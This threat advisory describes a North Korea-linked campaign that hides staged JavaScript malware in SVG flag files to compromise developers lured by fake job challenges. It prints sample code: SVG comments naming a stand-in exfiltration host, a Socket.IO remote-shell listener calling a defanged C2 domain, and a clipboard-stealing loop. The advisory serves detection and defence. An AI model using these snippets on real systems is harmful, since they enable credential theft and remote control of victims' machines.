## Executive summary

A campaign run by **actors aligned with North Korea (DPRK)** called **Contagious
Interview (REF9403)** uses **steganography in SVG files** to hide four-stage
malware aimed specifically at **software developers**.

**The critical point:** at the time of disclosure, **no antivirus engine** was
detecting the trojanised repositories. This is not a missing signature: it is a
structural gap in how antivirus products analyse the semantic content of an SVG.

**Key metrics:**

- Severity: CRITICAL
- Target: people who write software
- Method: steganography in SVG files
- Antivirus detection at disclosure: none
- Payload: four stages, aligned with OTTERCOOKIE
- Disclosure: 18 July 2026

---

## Context: why this case matters

**It breaks a very common intuition.** An SVG reads as an image, and an
image reads as inert data. It is a text file that accepts arbitrary comments, and
anything fits in there.

**The target is whoever builds, not whoever consumes.** A development
machine concentrates infrastructure credentials, repository access and signing
keys. Compromising it pays better than compromising an end user.

**It shows the limit of centralised controls.** Nothing an organisation
deploys at its perimeter reaches a repository somebody clones and runs on their own
machine.

## 1. The attack: a fake job offer

The attack starts simple and works well.

### The vector: social engineering

The actors pose as technical recruiters and post openings on professional networks:

```
[LURE] FAKE JOB POSTING:
═══════════════════════════════════════════
Company:  "TechCorp Innovations"
Position: Senior Full-Stack Developer
Location: Remote
Salary:   $120k-140k

"Interested? Complete our coding challenge:
https://github.com/techcorp-innovations/developer-challenge"

(Link points to a trojanised repository)
═══════════════════════════════════════════
```

### Why it works

1. **Professional curiosity works against you.** A coding challenge is a normal way
   to measure your own level, so running it does not feel like a risk.
2. **GitHub carries trust it has not earned.** Hosting code there says nothing about
   who wrote it, but it lowers the guard of whoever clones it.
3. **The repository contains real code and it runs.** Nothing in the experience of
   using it suggests there is anything else inside.
4. **An image does not look like an executable.** And antivirus products do not treat
   it as one either: they do not analyse the semantic content of an SVG.

## 2. The container: SVG steganography

### How it works

The actors hide **fragmented JavaScript malware** inside **SVG files of country
flags**.

```xml
<!-- File: src/assets/flags/us-flag.svg (apparently harmless) -->
<svg viewBox="0 0 100 100" xmlns="http://www.w3.org/2000/svg">
  <!-- US Flag stripes -->
  <rect x="0" y="0" width="100" height="100" fill="#B22234" />
  <rect x="0" y="8" width="100" height="8" fill="white" />

  <!-- THE MALWARE LIVES HERE -->
  <!-- Stage 1: var _0x4f2c=['https://c2.example.com','exfil_data']; -->
  <!-- Stage 2: function steal_credentials() { ... } -->
  <!-- Stage 3: fetch('/api/service/makelog', {method:'POST'...}) -->
  <!-- Stage 4: setInterval(() => exfiltrate(), 60000) -->
</svg>
```

### Why this evades antivirus

**Antivirus products are designed to:**
- <Pass />Detect malicious code in executables
- <Pass />Detect scripts in `.js` or `.ps1` files
- <Pass />Detect manipulation of an image at the pixel level

**Antivirus products are NOT designed to:**
- <Fail />Read the comments inside an SVG
- <Fail />Understand that commented-out text is still code
- <Fail />Analyse the semantic content of an XML document

**Result:** perfect concealment. Zero detections.

## 3. The payload: OTTERCOOKIE in four stages

When the developer runs the project (`npm install` → `npm run build`):

### Stage 1: browser credential theft

```javascript
// Extracted from malware analysis
function steal_browser_credentials() {
  // Accesses:
  // - Chrome/Firefox stored passwords
  // - Saved credit cards
  // - OAuth tokens
  // - Session cookies

  exfiltrate_to_c2(credentials);
}
```

**What it looks for:**
- GitHub tokens
- AWS credentials
- Cryptocurrency wallet extensions

### Stage 2: cryptocurrency wallet theft

It aims specifically at development machines, which tend to hold:
- Funds accumulated over time
- Private keys stored on disk
- Recovery phrases sitting open in memory

### Stage 3: remote access trojan over Socket.IO

```javascript
const io = require('socket.io-client');
const socket = io('hxxps://rightwidth[.]dev:443');

socket.on('execute_command', (cmd) => {
  // Execute arbitrary shell commands
  exec(cmd, (err, stdout) => {
    socket.emit('command_result', stdout);
  });
});
```

**What it gives the attacker:**
- Arbitrary command execution on the machine
- Installation of additional backdoors
- Lateral movement into the rest of the network
- The ability to operate the victim's cryptocurrency on an exchange

### Stage 4: clipboard monitoring

```javascript
// Constantly monitors the clipboard
setInterval(() => {
  const clipboard_content = get_clipboard();

  if (clipboard_content.includes('0x') || // Crypto address
      clipboard_content.includes('http') || // URLs
      clipboard_content.match(/key|secret|password/i)) { // Credentials

    exfiltrate_to_c2(clipboard_content);
  }
}, 5000); // Every 5 seconds
```

**What for:** capturing credentials, wallet addresses and tokens at the moment
somebody copies and pastes them — which is exactly when they are in the clear.

## Lessons learned

### For whoever writes the code

1. **Do not run code of unknown origin**
   - A repository being on GitHub does not make it trustworthy: review it before cloning
   - Read the code before running `npm install`

2. **Steganography in images is a poorly watched vector**
   - An `.svg` or `.png` file is not harmless because of its extension
   - Watch processes that open media files and then do more than display them

3. **Keeping cryptocurrency wallets on a work machine is a risk**
   - Hardware wallet for funds that matter
   - Separate machines for development and for crypto

4. **Code review is critical in the supply chain**
   - Above all for dependencies that get downloaded
   - Security scanning in the continuous integration pipeline is not optional

### For whoever analyses in a SOC

1. **Extend detection beyond the usual file types**
   - Write YARA rules for the content of SVG comments
   - Watch for Base64 decoding patterns
   - Hunt for Socket.IO imports, which in this context give away a remote access trojan

2. **Targeting developers demands its own defences**
   - Watch accesses to credentials stored in the browser
   - Alert on activity from cryptocurrency wallet extensions
   - Track `npm install` runs coming from unusual origins

3. **Zero antivirus detections is not zero threat**
   - File integrity monitoring becomes critical
   - Behavioural analysis matters more than the signature
   - An EDR contributes here what traditional antivirus cannot see

### Recommendations

**Implement:**
1. Software supply chain verification: code signing and package integrity
2. Security training for the development team, focused on social engineering
3. Repository scanning for payloads embedded in SVG and media files
4. Behavioural analysis of processes that run at machine start-up
5. Proactive hunting for SVG comment blocks that contain code
6. Mandatory hardware wallets for cryptocurrency funds
7. Browser extension audits and an allowlist
8. An incident response plan for compromised development machines

**Monitor:**
1. Access to SVG and image files by JavaScript processes
2. Socket.IO library imports from unusual origins
3. Obfuscated code patterns in project dependencies
4. Clipboard accesses
5. Command and control infrastructure associated with DPRK campaigns

## Conclusion

Four things this case makes clear:

1. **Steganography has stopped being an academic curiosity** and become a delivery
   vector in active campaigns.
2. **Whoever writes the code is a high-value target**, not collateral damage: they
   hold infrastructure credentials, repository access and often funds of their own.
3. **Antivirus products have a structural gap**, not an isolated failure: they do not
   analyse the semantic content of the formats they consider harmless.
4. **Supply chain security is a shared responsibility.** No organisational tool covers
   what somebody runs on their own machine.
5. **A format becomes dangerous when nobody looks at it.** There is nothing inherently
   insecure about SVG: what is missing is anyone treating it as code.
